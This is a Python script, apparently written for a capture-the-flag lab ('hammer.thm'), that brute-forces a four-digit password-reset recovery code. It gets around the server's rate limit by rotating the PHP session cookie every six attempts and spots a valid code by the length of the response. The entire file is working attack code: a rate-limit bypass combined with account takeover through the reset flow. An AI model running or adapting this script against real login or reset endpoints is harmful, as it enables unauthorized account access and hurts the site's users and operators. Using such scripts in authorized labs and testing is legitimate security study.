import requests
import sys

URL = "http://10.130.190.89:1337/reset_password.php"
EMAIL = "tester@hammer.thm"
# Added Connection: close to prevent hanging
HEADERS = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36",
    "Connection": "close" 
}

def get_new_session():
    """Initializes session and resets rate limit."""
    # Use a single session object for the reset process
    s = requests.Session()
    try:
        # Step 1: Get the page to set the initial cookie
        s.get(URL, headers=HEADERS, timeout=5)
        
        # Step 2: Post email to initialize the recovery state
        # Added 's' parameter as 180 to match the page default
        data = {"email": EMAIL, "s": "180"}
        resp = s.post(URL, data=data, headers=HEADERS, timeout=5)
        
        return s.cookies.get("PHPSESSID")
    except Exception as e:
        print(f"\n[-] Session Error: {e}")
        return None

def main():
    print("[*] Starting brute-force. Rotating session every 6 attempts...")
    
    current_sid = get_new_session()
    if not current_sid:
        print("[-] Could not get initial SID. Check if the IP is correct.")
        return

    print(f"[*] Initial SID: {current_sid}")

    for i in range(700, 10000):
        code = f"{i:04d}"

        # Reset session every 6 attempts
        if i > 0 and i % 6 == 0:
            current_sid = get_new_session()
            while not current_sid: # Retry if session reset fails
                current_sid = get_new_session()
            
        try:
            # We use a bare request here with the manually injected cookie
            cookies = {"PHPSESSID": current_sid}
            # Match the payload exactly from your logs
            payload = {"recovery_code": code, "s": "180"}
            
            # Using a short timeout ensures the script skips and retries if the server lags
            r = requests.post(URL, data=payload, headers=HEADERS, cookies=cookies, timeout=5)
            
            # Update output on the same line to keep the terminal clean
            print(f"[*] Testing: {code} (SID: {current_sid})", end="\r")

            if len(r.text.split()) != 148:
                print(f"\n\n[+] SUCCESS! Code: {code}")
                print(f"[+] Final SID: {current_sid}")
                # Print a bit of the response to see the flag/success message
                print(f"[+] Response snippet: {r.text[:200]}")
                break

        except requests.exceptions.RequestException:
            print(f"\n[!] Timeout on {code}, retrying session...")
            current_sid = get_new_session()
            continue

if __name__ == "__main__":
    main()
